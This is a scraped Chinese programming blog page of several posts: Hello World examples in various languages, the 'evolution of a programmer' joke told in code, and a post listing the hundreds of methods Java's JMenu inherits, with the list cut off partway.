mp;oid=2&amp;psts=ABHeCvi1vj-yNNUk4LJNYUY2tPtP7oRlmjb2LB2qQjBAig3v-7rwoCPENmxtTEgTz4_T9FszyEfH_J3epT-Iu38KYFXFITk&amp;pvsid=1581945870406545&amp;tmod=1102801285&amp;uas=0&amp;nvt=1&amp;ref=https%3A%2F%2Fcoolshell.cn%2Fpage%2F71&amp;fc=1408&amp;brdim=0%2C0%2C0%2C0%2C1463%2C0%2C1463%2C867%2C1463%2C764&amp;vis=1&amp;rsz=%7C%7Cs%7C&amp;abl=NS&amp;fu=128&amp;bc=31&amp;jar=2023-05-15-08&amp;ifi=4&amp;uci=a!4&amp;btvi=2&amp;fsb=1&amp;xpc=ir2EMzzqze&amp;p=https%3A//coolshell.cn&amp;dtd=6406" data-google-container-id="a!4" data-google-query-id="CK2D4MP79v4CFSqH6QUd4m8P5Q" data-load-complete="true" style="box-sizing: border-box; max-width: 100%; width: 704px; left: 0px; top: 0px; border: 0px; height: 280px;"></iframe>

“hello, world” 程序的标准打印内容必须满足“全小写，无惊叹号，逗点后需空一格”，不过流传至今，完全恪守传统的反而罕见。



下面我们来看几个例子：

```
#include <stdio.h>

int main(void)
{
   printf("Hello, world!n");
   return 0;
}
#include <iostream>
using namespace std;

int main()
{
    cout << "Hello, world!" << endl;
    return 0;
}
```

<iframe id="aswift_2" name="aswift_2" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" width="704" height="280" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" src="https://googleads.g.doubleclick.net/pagead/ads?client=ca-pub-3415450859608158&amp;output=html&amp;h=280&amp;adk=3618254820&amp;adf=3198370048&amp;pi=t.aa~a.425447425~i.13~rp.4&amp;daaos=1684125332196&amp;w=704&amp;fwrn=4&amp;fwrnh=100&amp;lmt=1684135104&amp;num_ads=1&amp;rafmt=1&amp;armr=3&amp;sem=mc&amp;pwprc=9848079135&amp;ad_type=text_image&amp;format=704x280&amp;url=https%3A%2F%2Fcoolshell.cn%2Farticles%2F169.html&amp;fwr=0&amp;pra=3&amp;rh=176&amp;rw=703&amp;rpe=1&amp;resp_fmts=3&amp;wgl=1&amp;fa=27&amp;adsid=ChEI8LCHowYQ1PStmYmQo8OEARI5ANXa3bgONgx_MHxJ04i3pm0cDLEGUs_Pwg5TUJUcY8TxVSZgBs2BjzKot42N9DqI8Q9ZdLCf8tz8&amp;uach=WyJXaW5kb3dzIiwiMTUuMC4wIiwieDg2IiwiIiwiMTEzLjAuNTY3Mi45MyIsW10sMCxudWxsLCI2NCIsW1siR29vZ2xlIENocm9tZSIsIjExMy4wLjU2NzIuOTMiXSxbIkNocm9taXVtIiwiMTEzLjAuNTY3Mi45MyJdLFsiTm90LUEuQnJhbmQiLCIyNC4wLjAuMCJdXSwwXQ..&amp;dt=1684141369781&amp;bpp=2&amp;bdt=2364&amp;idt=2&amp;shv=r20230510&amp;mjsv=m202305090101&amp;ptt=9&amp;saldr=aa&amp;abxe=1&amp;cookie=ID%3D61fbd1a4204d6f0d-22794c5f46da0021%3AT%3D1677650655%3ART%3D1677650655%3AS%3DALNI_MY9K_eABMVw6xwsKnW5G_0wJN0y0Q&amp;gpic=UID%3D00000bcf61a72ea0%3AT%3D1677650655%3ART%3D1684129911%3AS%3DALNI_MbZuBf5sA5nf1llTFY7bTei5dA4cQ&amp;prev_fmts=0x0%2C1200x280&amp;nras=3&amp;correlator=5191836851216&amp;frm=20&amp;pv=1&amp;ga_vid=1380805030.1675847918&amp;ga_sid=1684140223&amp;ga_hid=2002908876&amp;ga_fc=1&amp;u_tz=480&amp;u_his=1&amp;u_h=915&amp;u_w=1463&amp;u_ah=867&amp;u_aw=1463&amp;u_cd=24&amp;u_sd=1.75&amp;dmc=8&amp;adx=225&amp;ady=1935&amp;biw=1447&amp;bih=764&amp;scr_x=0&amp;scr_y=0&amp;eid=44759927%2C44759876%2C44759842%2C44773810%2C31074602%2C44772268%2C44782466%2C44785295%2C44788442%2C44789779%2C44789820&amp;oid=2&amp;psts=ABHeCvi1vj-yNNUk4LJNYUY2tPtP7oRlmjb2LB2qQjBAig3v-7rwoCPENmxtTEgTz4_T9FszyEfH_J3epT-Iu38KYFXFITk&amp;pvsid=1581945870406545&amp;tmod=1102801285&amp;uas=0&amp;nvt=1&amp;ref=https%3A%2F%2Fcoolshell.cn%2Fpage%2F71&amp;fc=1408&amp;brdim=0%2C0%2C0%2C0%2C1463%2C0%2C1463%2C867%2C1463%2C764&amp;vis=1&amp;rsz=%7C%7Cs%7C&amp;abl=NS&amp;fu=128&amp;bc=31&amp;jar=2023-05-15-08&amp;ifi=3&amp;uci=a!3&amp;btvi=1&amp;fsb=1&amp;xpc=oyuumRvoT2&amp;p=https%3A//coolshell.cn&amp;dtd=6381" data-google-container-id="a!3" data-google-query-id="CNSJ3sP79v4CFdOC6QUdZDAOqg" data-load-complete="true" style="box-sizing: border-box; max-width: 100%; width: 704px; left: 0px; top: 0px; border: 0px; height: 280px;"></iframe>

```
public class Hello
{
    public static void main(String[] args)
    {
        System.out.println("Hello, world!");
    }
}
```

不过，最全的Hello World的集中营在这里：（请大家围观这个网页）

[**http://www.roesler-ac.de/wolfram/hello.htm**](http://www.roesler-ac.de/wolfram/hello.htm)

这个网站很BT啊，其开始是从1994年10月3日，于1999年12月30日上互联网，2005年7月14日收集到了超过200个不同语言的Hello World，2006年12月6日达到300个，2008年2月27日达到400个。

今天这个网站有一共421个不同语言的Hello World，其中有63个来自人类的语言。

# OMG, WINDOWS 7 来自未来

今天，2009年3月14日，某个工程师准备把自己的Windows 7 build7000升级到build 7057，在安装过程中，我们的工程师选择了备份老的系统，于是老的build被备份成到了windows.old目录下，然后当整个系统运行时，这位朋友发现了这一版本的Windows 7好像使用了很多来自外星的技术，很明显他扭曲了时间，下面是他的发现和截屏。

# 幽默：程序员的进化

**高中时期**

```
  10 PRINT "HELLO WORLD"
  20 END
```

**大学新生**

```
  program Hello(input, output)
    begin
      writeln(\'Hello World\')
    end.
```


**高年级大学生**

```
#include 
 
int main(void)
{
   printf("Hello, world!\\n");
   return 0;
}
```

**职业新手**

```
  #include 
  void main(void)
  {
    char *message[] = {"Hello ", "World"};
    int i;
 
    for(i = 0; i < 2; ++i)
      printf("%s", message[i]);
    printf("\\n");
  }
```

职业老手

```
  #include 
  #include 
 using namespace std;

  class string
  {
  private:
    int size;
    char *ptr;
 
  string() : size(0), ptr(new char[1]) { ptr[0] = 0; }
 
    string(const string &s) : size(s.size)
    {
      ptr = new char[size + 1];
      strcpy(ptr, s.ptr);
    }
 
    ~string()
    {
      delete [] ptr;
    }
 
    friend ostream &operator <<(ostream &, const string &);
    string &operator=(const char *);
  };
 
  ostream &operator<<(ostream &stream, const string &s)
  {
    return(stream << s.ptr);
  }
 
  string &string::operator=(const char *chrs)
  {
    if (this != &chrs)
    {
      delete [] ptr;
     size = strlen(chrs);
      ptr = new char[size + 1];
      strcpy(ptr, chrs);
    }
    return(*this);
  }
 
  int main()
  {
    string str;
 
    str = "Hello World";
    cout << str << endl;
 
    return(0);
  }
```

**大师级**

```
  [
  uuid(2573F8F4-CFEE-101A-9A9F-00AA00342820)
  ]
  library LHello
  {
      // bring in the master library
      importlib("actimp.tlb");
      importlib("actexp.tlb");
 
      // bring in my interfaces
      #include "pshlo.idl"
 
      [
      uuid(2573F8F5-CFEE-101A-9A9F-00AA00342820)
      ]
      cotype THello
   {
   interface IHello;
   interface IPersistFile;
   };
  };
 
  [
  exe,
  uuid(2573F890-CFEE-101A-9A9F-00AA00342820)
  ]
  module CHelloLib
  {
 
      // some code related header files
      importheader();
      importheader();
      importheader();
      importheader("pshlo.h");
      importheader("shlo.hxx");
      importheader("mycls.hxx");
 
      // needed typelibs
      importlib("actimp.tlb");
      importlib("actexp.tlb");
      importlib("thlo.tlb");
 
      [
      uuid(2573F891-CFEE-101A-9A9F-00AA00342820),
      aggregatable
      ]
      coclass CHello
   {
   cotype THello;
   };
  };
 
 
  #include "ipfix.hxx"
 
  extern HANDLE hEvent;
 
  class CHello : public CHelloBase
  {
  public:
      IPFIX(CLSID_CHello);
 
      CHello(IUnknown *pUnk);
      ~CHello();
 
      HRESULT  __stdcall PrintSz(LPWSTR pwszString);
 
  private:
      static int cObjRef;
  };
 
 
  #include 
  #include 
  #include 
  #include 
  #include "thlo.h"
  #include "pshlo.h"
  #include "shlo.hxx"
  #include "mycls.hxx"
 
  int CHello::cObjRef = 0;
 
  CHello::CHello(IUnknown *pUnk) : CHelloBase(pUnk)
  {
      cObjRef++;
      return;
  }
 
  HRESULT  __stdcall  CHello::PrintSz(LPWSTR pwszString)
  {
      printf("%ws
", pwszString);
      return(ResultFromScode(S_OK));
  }
 
 
  CHello::~CHello(void)
  {
 
  // when the object count goes to zero, stop the server
  cObjRef--;
  if( cObjRef == 0 )
      PulseEvent(hEvent);
 
  return;
  }
 
  #include 
  #include 
  #include "pshlo.h"
  #include "shlo.hxx"
  #include "mycls.hxx"
 
  HANDLE hEvent;
 
   int _cdecl main(
  int argc,
  char * argv[]
  ) {
  ULONG ulRef;
  DWORD dwRegistration;
  CHelloCF *pCF = new CHelloCF();
 
  hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
 
  // Initialize the OLE libraries
  CoInitializeEx(NULL, COINIT_MULTITHREADED);
 
  CoRegisterClassObject(CLSID_CHello, pCF, CLSCTX_LOCAL_SERVER,
      REGCLS_MULTIPLEUSE, &dwRegistration);
 
  // wait on an event to stop
  WaitForSingleObject(hEvent, INFINITE);
 
  // revoke and release the class object
  CoRevokeClassObject(dwRegistration);
  ulRef = pCF->Release();
 
  // Tell OLE we are going away.
  CoUninitialize();
 
  return(0); }
 
  extern CLSID CLSID_CHello;
  extern UUID LIBID_CHelloLib;
 
  CLSID CLSID_CHello = { /* 2573F891-CFEE-101A-9A9F-00AA00342820 */
      0x2573F891,
      0xCFEE,
      0x101A,
      { 0x9A, 0x9F, 0x00, 0xAA, 0x00, 0x34, 0x28, 0x20 }
  };
 
  UUID LIBID_CHelloLib = { /* 2573F890-CFEE-101A-9A9F-00AA00342820 */
      0x2573F890,
      0xCFEE,
      0x101A,
      { 0x9A, 0x9F, 0x00, 0xAA, 0x00, 0x34, 0x28, 0x20 }
  };
 
  #include 
  #include 
  #include 
  #include 
  #include 
  #include "pshlo.h"
  #include "shlo.hxx"
  #include "clsid.h"
 
  int _cdecl main(
  int argc,
  char * argv[]
  ) {
  HRESULT  hRslt;
  IHello        *pHello;
  ULONG  ulCnt;
  IMoniker * pmk;
  WCHAR  wcsT[_MAX_PATH];
  WCHAR  wcsPath[2 * _MAX_PATH];
 
  // get object path
  wcsPath[0] = \'\\0\';
  wcsT[0] = \'\\0\';
  if( argc > 1) {
      mbstowcs(wcsPath, argv[1], strlen(argv[1]) + 1);
      wcsupr(wcsPath);
      }
  else {
      fprintf(stderr, "Object path must be specified\\n");
      return(1);
      }
 
  // get print string
  if(argc > 2)
      mbstowcs(wcsT, argv[2], strlen(argv[2]) + 1);
  else
      wcscpy(wcsT, L"Hello World");
 
  printf("Linking to object %ws\\n", wcsPath);
  printf("Text String %ws\\n", wcsT);
 
  // Initialize the OLE libraries
  hRslt = CoInitializeEx(NULL, COINIT_MULTITHREADED);
 
  if(SUCCEEDED(hRslt)) {
 
 
      hRslt = CreateFileMoniker(wcsPath, &pmk);
      if(SUCCEEDED(hRslt))
   hRslt = BindMoniker(pmk, 0, IID_IHello, (void **)&pHello);
 
      if(SUCCEEDED(hRslt)) {
 
   // print a string out
   pHello->PrintSz(wcsT);
 
   Sleep(2000);
   ulCnt = pHello->Release();
   }
      else
   printf("Failure to connect, status: %lx", hRslt);
 
      // Tell OLE we are going away.
      CoUninitialize();
      }
 
  return(0);
  }
```

**黑客学徒**

```
  #!/usr/local/bin/perl
  $msg="Hello, world.\\n";
  if ($#ARGV >= 0) {
    while(defined($arg=shift(@ARGV))) {
      $outfilename = $arg;
      open(FILE, ">" . $outfilename) || die "Can\'t write $arg: $!\\n";
      print (FILE $msg);
      close(FILE) || die "Can\'t close $arg: $!\\n";
    }
  } else {
    print ($msg);
  }
  1;
```

**有经验的黑客**

```
  #include 
  #define S "Hello, World\\n"
  main(){exit(printf(S) == strlen(S) ? 0 : 1);}
```

**老练的黑客**

```
  % cc -o a.out ~/src/misc/hw/hw.c
  % a.out
```

**超级黑客**

```
  % echo "Hello, world."
```

**一线经理**

```
  10 PRINT "HELLO WORLD"
  20 END
```

**中层经理**

```
  mail -s "Hello, world." bob@b12
  Bob, could you please write me a program that prints "Hello, world."?
  I need it by tomorrow.
  ^D
```

**高级经理**

```
  % zmail jim
  I need a "Hello, world." program by this afternoon.
```

**首席执行官**

```
  % letter
  letter: Command not found.
  % mail
  To: ^X ^F ^C
  % help mail
  help: Command not found.
  % damn!
  !: Event unrecognized
  % logout
```

来源：未知

# OMG, JAVE的JMENU居然有433个方法

Java的Swing类库中有一个类叫JMenu，这个类上面有7层的继承，加上所有被继承下来的方法，这个类一共有433个方法，虽然，很多类是从上面继承下来的，而它自己的方法并没有定义太多的方法，不过，继承体系过深，在底层类上要想知道所有的继承下来的东西并不是一样容易的事情。这个例子展示了一个滥用代码重用的反面案例。我个人认为我们应该反思一下滥用面向对象的作法。

要把Java一个类所有的方法例出来并不是一件难事，使用Javascript 利用Firefox浏览器所支持的Package来穷举JMenu的方法可以很方便的列出所有的方法。


下面是这段Javascripts程序：

 

```

```

虽然，在Firefox下有比较严格的安全限制，我们并不一定能够使用Swing类库中所有的Java方法，但我们查看一下其继承体系和一个类所拥有的方法却没有什么安全问题。

使用上面那段程序，你可以在Firefox中输出JMenu的433个如下的方法，下面是的列表中JMenu的方法在最后。

下面你可以理解为是在灌水：

1. java.awt.Component.action(java.awt.Event,java.lang.Object)
2. java.awt.Component.add(java.awt.PopupMenu)
3. java.awt.Component.addComponentListener(java.awt.event.ComponentListener)
4. java.awt.Component.addFocusListener(java.awt.event.FocusListener)
5. java.awt.Component.addHierarchyBoundsListener(java.awt.event.HierarchyBoundsListener)
6. java.awt.Component.addHierarchyListener(java.awt.event.HierarchyListener)
7. java.awt.Component.addInputMethodListener(java.awt.event.InputMethodListener)
8. java.awt.Component.addKeyListener(java.awt.event.KeyListener)
9. java.awt.Component.addMouseListener(java.awt.event.MouseListener)
10. java.awt.Component.addMouseMotionListener(java.awt.event.MouseMotionListener)
11. java.awt.Component.addMouseWheelListener(java.awt.event.MouseWheelListener)
12. java.awt.Component.bounds()
13. java.awt.Component.checkImage(java.awt.Image,int,int,java.awt.image.ImageObserver)
14. java.awt.Component.checkImage(java.awt.Image,java.awt.image.ImageObserver)
15. java.awt.Component.contains(java.awt.Point)
16. java.awt.Component.createImage(int,int)
17. java.awt.Component.createImage(java.awt.image.ImageProducer)
18. java.awt.Component.createVolatileImage(int,int)
19. java.awt.Component.createVolatileImage(int,int,java.awt.ImageCapabilities)
20. java.awt.Component.dispatchEvent(java.awt.AWTEvent)
21. java.awt.Component.enable(boolean)
22. java.awt.Component.enableInputMethods(boolean)
23. java.awt.Component.firePropertyChange(java.lang.String,byte,byte)
24. java.awt.Component.firePropertyChange(java.lang.String,double,double)
25. java.awt.Component.firePropertyChange(java.lang.String,float,float)
26. java.awt.Component.firePropertyChange(java.lang.String,long,long)
27. java.awt.Component.firePropertyChange(java.lang.String,short,short)
28. java.awt.Component.getBackground()
29. java.awt.Component.getBounds()
30. java.awt.Component.getColorModel()
31. java.awt.Component.getComponentListeners()
32. java.awt.Component.getComponentOrientation()
33. java.awt.Component.getCursor()
34. java.awt.Component.getDropTarget()
35. java.awt.Component.getFocusCycleRootAncestor()
36. java.awt.Component.getFocusListeners()
37. java.awt.Component.getFocusTraversalKeysEnabled()
38. java.awt.Component.getFont()
39. java.awt.Component.getForeground()
40. java.awt.Component.getGraphicsConfiguration()
41. java.awt.Component.getHierarchyBoundsListeners()
42. java.awt.Component.getHierarchyListeners()
43. java.awt.Component.getIgnoreRepaint()
44. java.awt.Component.getInputContext()
45. java.awt.Component.getInputMethodListeners()
46. java.awt.Component.getInputMethodRequests()
47. java.awt.Component.getKeyListeners()
48. java.awt.Component.getLocale()
49. java.awt.Component.getLocation()
50. java.awt.Component.getLocationOnScreen()
51. java.awt.Component.getMouseListeners()
52. java.awt.Component.getMouseMotionListeners()
53. java.awt.Component.getMousePosition()
54. java.awt.Component.getMouseWheelListeners()
55. java.awt.Component.getName()
56. java.awt.Component.getParent()
57. java.awt.Component.getPeer()
58. java.awt.Component.getPropertyChangeListeners()
59. java.awt.Component.getPropertyChangeListeners(java.lang.String)
60. java.awt.Component.getSize()
61. java.awt.Component.getToolkit()
62. java.awt.Component.getTreeLock()
63. java.awt.Component.gotFocus(java.awt.Event,java.lang.Object)
64. java.awt.Component.handleEvent(java.awt.Event)
65. java.awt.Component.hasFocus()
66. java.awt.Component.hide()
67. java.awt.Component.inside(int,int)
68. java.awt.Component.isBackgroundSet()
69. java.awt.Component.isCursorSet()
70. java.awt.Component.isDisplayable()
71. java.awt.Component.isEnabled()
72. java.awt.Component.isFocusOwner()
73. java.awt.Component.isFocusTraversable()
74. java.awt.Component.isFocusable()
75. java.awt.Component.isFontSet()
76. java.awt.Component.isForegroundSet()
77. java.awt.Component.isLightweight()
78. java.awt.Component.isMaximumSizeSet()
79. java.awt.Component.isMinimumSizeSet()
80. java.awt.Component.isPreferredSizeSet()
81. java.awt.Component.isShowing()
82. java.awt.Component.isValid()
83. java.awt.Component.isVisible()
84. java.awt.Component.keyDown(java.awt.Event,int)
85. java.awt.Component.keyUp(java.awt.Event,int)
86. java.awt.Component.list()
87. java.awt.Component.list(java.io.PrintStream)
88. java.awt.Component.list(java.io.PrintWriter)
89. java.awt.Component.location()
90. java.awt.Component.lostFocus(java.awt.Event,java.lang.Object)
91. java.awt.Component.mouseDown(java.awt.Event,int,int)
92. java.awt.Component.mouseDrag(java.awt.Event,int,int)
93. java.awt.Component.mouseEnter(java.awt.Event,int,int)
94. java.awt.Component.mouseExit(java.awt.Event,int,int)
95. java.awt.Component.mouseMove(java.awt.Event,int,int)
96. java.awt.Component.mouseUp(java.awt.Event,int,int)
97. java.awt.Component.move(int,int)
98. java.awt.Component.nextFocus()
99. java.awt.Component.paintAll(java.awt.Graphics)
100. java.awt.Component.postEvent(java.awt.Event)
101. java.awt.Component.prepareImage(java.awt.Image,int,int,java.awt.image.ImageObserver)
102. java.awt.Component.prepareImage(java.awt.Image,java.awt.image.ImageObserver)
103. java.awt.Component.remove(java.awt.MenuComponent)
104. java.awt.Component.removeComponentListener(java.awt.event.ComponentListener)
105. java.awt.Component.removeFocusListener(java.awt.event.FocusListener)
106. java.awt.Component.removeHierarchyBoundsListener(java.awt.event.HierarchyBoundsListener)
107. java.awt.Component.removeHierarchyListener(java.awt.event.HierarchyListener)
108. java.awt.Component.removeInputMethodListener(java.awt.event.InputMethodListener)
109. java.awt.Component.removeKeyListener(java.awt.event.KeyListener)
110. java.awt.Component.removeMouseListener(java.awt.event.MouseListener)
111. java.awt.Component.removeMouseMotionListener(java.awt.event.MouseMotionListener)
112. java.awt.Component.removeMouseWheelListener(java.awt.event.MouseWheelListener)
113. java.awt.Component.removePropertyChangeListener(java.beans.PropertyChangeListener)
114. java.awt.Component.removePropertyChangeListener(java.lang.String,java.beans.PropertyChangeListener)
115. java.awt.Component.repaint()
116. java.awt.Component.repaint(int,int,int,int)
117. java.awt.Component.repaint(long)
118. java.awt.Component.resize(int,int)
119. java.awt.Component.resize(java.awt.Dimension)
120. java.awt.Component.setBounds(int,int,int,int)
121. java.awt.Component.setBounds(java.awt.Rectangle)
122. java.awt.Component.setCursor(java.awt.Cursor)
123. java.awt.Component.setDropTarget(java.awt.dnd.DropTarget)
124. java.awt.Component.setFocusTraversalKeysEnabled(boolean)
125. java.awt.Component.setFocusable(boolean)
126. java.awt.Component.setIgnoreRepaint(boolean)
127. java.awt.Component.setLocale(java.util.Locale)
128. java.awt.Component.setLocation(int,int)
129. java.awt.Component.setLocation(java.awt.Point)
130. java.awt.Component.setName(java.lang.String)
131. java.awt.Component.setSize(int,int)
132. java.awt.Component.setSize(java.awt.Dimension)
133. java.awt.Component.show()
134. java.awt.Component.show(boolean)
135. java.awt.Component.size()
136. java.awt.Component.toString()
137. java.awt.Component.transferFocus()
138. java.awt.Component.transferFocusBackward()
139. java.awt.Component.transferFocusUpCycle()
140. java.awt.Container.add(java.awt.Component,java.lang.Object)
141. java.awt.Container.add(java.awt.Component,java.lang.Object,int)
142. java.awt.Container.add(java.lang.String,java.awt.Component)
143. java.awt.Container.addContainerListener(java.awt.event.ContainerListener)
144. java.awt.Container.addPropertyChangeListener(java.beans.PropertyChangeListener)
145. java.awt.Container.addPropertyChangeListener(java.lang.String,java.beans.PropertyChangeListener)
146. java.awt.Container.areFocusTraversalKeysSet(int)
147. java.awt.Container.countComponents()
148. java.awt.Container.deliverEvent(java.awt.Event)
149. java.awt.Container.doLayout()
150. java.awt.Container.findComponentAt(int,int)
151. java.awt.Container.findComponentAt(java.awt.Point)
152. java.awt.Container.getComponent(int)
153. java.awt.Container.getComponentAt(int,int)
154. java.awt.Container.getComponentAt(java.awt.Point)
155. java.awt.Container.getComponentCount()
156. java.awt.Container.getComponentZOrder(java.awt.Component)
157. java.awt.Container.getComponents()
158. java.awt.Container.getContainerListeners()
159. java.awt.Container.getFocusTraversalKeys(int)
160. java.awt.Container.getFocusTraversalPolicy()
161. java.awt.Container.getLayout()
162. java.awt.Container.getMousePosition(boolean)
163. java.awt.Container.insets()
164. java.awt.Container.invalidate()
165. java.awt.Container.isAncestorOf(java.awt.Component)
166. java.awt.Container.isFocusCycleRoot()
167. java.awt.Container.isFocusCycleRoot(java.awt.Container)
168. java.awt.Container.isFocusTraversalPolicyProvider()
169. java.awt.Container.isFocusTraversalPolicySet()
170. java.awt.Container.layout()
171. java.awt.Container.list(java.io.PrintStream,int)
172. java.awt.Container.list(java.io.PrintWriter,int)
173. java.awt.Container.locate(int,int)
174. java.awt.Container.minimumSize()
175. java.awt.Container.paintComponents(java.awt.Graphics)
176. java.awt.Container.preferredSize()
177. java.awt.Container.printComponents(java.awt.Graphics)
178. java.awt.Container.removeContainerListener(java.awt.event.ContainerListener)
179. java.awt.Container.setComponentZOrder(java.awt.Component,int)
180. java.awt.Container.setFocusCycleRoot(boolean)
181. java.awt.Container.setFocusTraversalPolicy(java.awt.FocusTraversalPolicy)
182. java.awt.Container.setFocusTraversalPolicyProvider(boolean)
183. java.awt.Container.transferFocusDownCycle()
184. java.awt.Container.validate()
185. java.lang.Object.equals(java.lang.Object)
186. java.lang.Object.getClass()
187. java.lang.Object.hashCode()
188. java.lang.Object.notify()
189. java.lang.Object.notifyAll()
190. java.lang.Object.wait()
191. java.lang.Object.wait(long)
192. java.lang.Object.wait(long,int)
193. javax.swing.AbstractButton.addActionListener(java.awt.event.ActionListener)
194. javax.swing.AbstractButton.addChangeListener(javax.swing.event.ChangeListener)
195. javax.swing.AbstractButton.addItemListener(java.awt.event.ItemListener)
196. javax.swing.AbstractButton.doClick()
197. javax.swing.AbstractButton.getAction()
198. javax.swing.AbstractButton.getActionCommand()
199. javax.swing.AbstractButton.getActionListeners()
200. javax.swing.AbstractButton.getChangeListeners()
201. javax.swing.AbstractButton.getDisabledIcon()
202. javax.swing.AbstractButton.getDisabledSelectedIcon()
203. javax.swing.AbstractButton.getDisplayedMnemonicIndex()
204. javax.swing.AbstractButton.getHideActionText()
205. javax.swing.AbstractButton.getHorizontalAlignment()
206. javax.swing.AbstractButton.getHorizontalTextPosition()
207. javax.swing.AbstractButton.getIcon()
208. javax.swing.AbstractButton.getIconTextGap()
209. javax.swing.AbstractButton.getItemListeners()
210. javax.swing.AbstractButton.getLabel()
211. javax.swing.AbstractButton.getMargin()
212. javax.swing.AbstractButton.getMnemonic()
213. javax.swing.AbstractButton.getModel()
214. javax.swing.AbstractButton.getMultiClickThreshhold()
215. javax.swing.AbstractButton.getPressedIcon()
216. javax.swing.AbstractButton.getRolloverIcon()
217. javax.swing.AbstractButton.getRolloverSelectedIcon()
218. javax.swing.AbstractButton.getSelectedIcon()
219. javax.swing.AbstractButton.getSelectedObjects()
220. javax.swing.AbstractButton.getText()
221. javax.swing.AbstractButton.getUI()
222. javax.swing.AbstractButton.getVerticalAlignment()
223. javax.swing.AbstractButton.getVerticalTextPosition()
224. javax.swing.AbstractButton.imageUpdate(java.awt.Image,int,int,int,int,int)
225. javax.swing.AbstractButton.isBorderPainted()
226. javax.swing.AbstractButton.isContentAreaFilled()
227. javax.swing.AbstractButton.isFocusPainted()
228. javax.swing.AbstractButton.isRolloverEnabled()
229. javax.swing.AbstractButton.removeActionListener(java.awt.event.ActionListener)
230. javax.swing.AbstractButton.removeChangeListener(javax.swing.event.ChangeListener)
231. javax.swing.AbstractButton.removeItemListener(java.awt.event.ItemListener)
232. javax.swing.AbstractButton.removeNotify()
233. javax.swing.AbstractButton.setAction(javax.swing.Action)
234. javax.swing.AbstractButton.setActionCommand(java.lang.String)
235. javax.swing.AbstractButton.setBorderPainted(boolean)
236. javax.swing.AbstractButton.setContentAreaFilled(boolean)
237. javax.swing.AbstractButton.setDisabledIcon(javax.swing.Icon)
238. javax.swing.AbstractButton.setDisabledSelectedIcon(javax.swing.Icon)
239. javax.swing.AbstractButton.setDisplayedMnemonicIndex(int)
240. javax.swing.AbstractButton.setFocusPainted(boolean)
241. javax.swing.AbstractButton.setHideActionText(boolean)
242. javax.swing.AbstractButton.setHorizontalAlignment(int)
243. javax.swing.AbstractButton.setHorizontalTextPosition(int)
244. javax.swing.AbstractButton.setIcon(javax.swing.Icon)
245. javax.swing.AbstractButton.setIconTextGap(int)
246. javax.swing.AbstractButton.setLabel(java.lang.String)
247. javax.swing.AbstractButton.setLayout(java.awt.LayoutManager)
248. javax.swing.AbstractButton.setMargin(java.awt.Insets)
249. javax.swing.AbstractButton.setMnemonic(char)
250. javax.swing.AbstractButton.setMnemonic(int)
251. javax.swing.AbstractButton.setMultiClickThreshhold(long)
252. javax.swing.AbstractButton.setPressedIcon(javax.swing.Icon)
253. javax.swing.AbstractButton.setRolloverEnabled(boolean)
254. javax.swing.AbstractButton.setRolloverIcon(javax.swing.Icon)
255. javax.swing.AbstractButton.setRolloverSelectedIcon(javax.swing.Icon)
256. javax.swing.AbstractButton.setSelectedIcon(javax.swing.Icon)
257. javax.swing.AbstractButton.setText(java.lang.String)
258. javax.swing.AbstractButton.setUI(javax.swing.plaf.ButtonUI)
259. javax.swing.AbstractButton.setVerticalAlignment(int)
260. javax.swing.AbstractButton.setVerticalTextPosition(int)
261. javax.swing.JComponent.addAncestorListener(javax.swing.event.AncestorListener)
262. javax.swing.JComponent.addNotify()
263. javax.swing.JComponent.addVetoableChangeListener(java.beans.VetoableChangeListener)
264. javax.swing.JComponent.computeVisibleRect(java.awt.Rectangle)
265. javax.swing.JComponent.contains(int,int)
266. javax.swing.JComponent.createToolTip()
267. javax.swing.JComponent.disable()
268. javax.swing.JComponent.enable()
269. javax.swing.JComponent.firePropertyChange(java.lang.String,boolean,boolean)
270. javax.swing.JComponent.firePropertyChange(java.lang.String,char,char)
271. javax.swing.JComponent.firePropertyChange(java.lang.String,int,int)
272. javax.swing.JComponent.getActionForKeyStroke(javax.swing.KeyStroke)
273. javax.swing.JComponent.getActionMap()
274. javax.swing.JComponent.getAlignmentX()
275. javax.swing.JComponent.getAlignmentY()
276. javax.swing.JComponent.getAncestorListeners()
277. javax.swing.JComponent.getAutoscrolls()
278. javax.swing.JComponent.getBaseline(int,int)
279. javax.swing.JComponent.getBaselineResizeBehavior()
280. javax.swing.JComponent.getBorder()
281. javax.swing.JComponent.getBounds(java.awt.Rectangle)
282. javax.swing.JComponent.getClientProperty(java.lang.Object)
283. javax.swing.JComponent.getComponentPopupMenu()
284. javax.swing.JComponent.getConditionForKeyStroke(javax.swing.KeyStroke)
285. javax.swing.JComponent.getDebugGraphicsOptions()
286. javax.swing.JComponent.getDefaultLocale()
287. javax.swing.JComponent.getFontMetrics(java.awt.Font)
288. javax.swing.JComponent.getGraphics()
289. javax.swing.JComponent.getHeight()
290. javax.swing.JComponent.getInheritsPopupMenu()
291. javax.swing.JComponent.getInputMap()
292. javax.swing.JComponent.getInputMap(int)
293. javax.swing.JComponent.getInputVerifier()
294. javax.swing.JComponent.getInsets()
295. javax.swing.JComponent.getInsets(java.awt.Insets)
296. javax.swing.JComponent.getListeners(java.lang.Class)
297. javax.swing.JComponent.getLocation(java.awt.Point)
298. javax.swing.JComponent.getMaximumSize()
299. javax.swing.JComponent.getMinimumSize()
300. javax.swing.JComponent.getNextFocusableComponent()
301. javax.swing.JComponent.getPopupLocation(java.awt.event.MouseEvent)
302. javax.swing.JComponent.getPreferredSize()
303. javax.swing.JComponent.getRegisteredKeyStrokes()
304. javax.swing.JComponent.getRootPane()
305. javax.swing.JComponent.getSize(java.awt.Dimension)
306. javax.swing.JComponent.getToolTipLocation(java.awt.event.MouseEvent)
307. javax.swing.JComponent.getToolTipText()
308. javax.swing.JComponent.getToolTipText(java.awt.event.MouseEvent)
309. javax.swing.JComponent.getTopLevelAncestor()
310. javax.swing.JComponent.getTransferHandler()
311. javax.swing.JComponent.getVerifyInputWhenFocusTarget()
312. javax.swing.JComponent.getVetoableChangeListeners()
313. javax.swing.JComponent.getVisibleRect()
314. javax.swing.JComponent.getWidth()
315. javax.swing.JComponent.getX()
316. javax.swing.JComponent.getY()
317. javax.swing.JComponent.grabFocus()
318. javax.swing.JComponent.isDoubleBuffered()
319. javax.swing.JComponent.isLightweightComponent(java.awt.Component)
320. javax.swing.JComponent.isManagingFocus()
